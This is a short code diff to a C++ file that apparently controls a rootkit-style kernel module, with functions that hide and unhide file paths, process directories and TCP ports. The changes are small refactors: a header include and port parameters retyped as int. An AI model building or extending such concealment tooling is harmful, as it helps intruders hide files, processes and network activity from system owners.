@@ -1,9 +1,9 @@
 #include "hider.h"
 
+#include "../kernel_access/kernel_access.h"
+
 #include <cstring>
 #include <string>
-
-static kernel_access kernelAccess;
 
 void hide_absolute_path(const char *path) {
     msg_to_module msg;
@@ -40,7 +40,7 @@ void unhide_process_dir(int pid) {
     unhide_absolute_path(path.c_str());
 }
 
-void hide_tcp4_port(PORT port) {
+void hide_tcp4_port(int port) {
     msg_to_module msg;
     memset(&msg, '\x00', sizeof(msg));
 
@@ -50,7 +50,7 @@ void hide_tcp4_port(PORT port) {
     kernelAccess.my_send_msg(msg);
 }
 
-void unhide_tcp4_port(PORT port) {
+void unhide_tcp4_port(int port) {
     msg_to_module msg;
     memset(&msg, '\x00', sizeof(msg));
 
@@ -60,7 +60,7 @@ void unhide_tcp4_port(PORT port) {
     kernelAccess.my_send_msg(msg);
 }
 
-void hide_tcp6_port(PORT port) {
+void hide_tcp6_port(int port) {
     msg_to_module msg;
     memset(&msg, '\x00', sizeof(msg));
 
@@ -70,7 +70,7 @@ void hide_tcp6_port(PORT port) {
     kernelAccess.my_send_msg(msg);
 }
 
-void unhide_tcp6_port(PORT port) {
+void unhide_tcp6_port(int port) {
     msg_to_module msg;
     memset(&msg, '\x00', sizeof(msg));
 
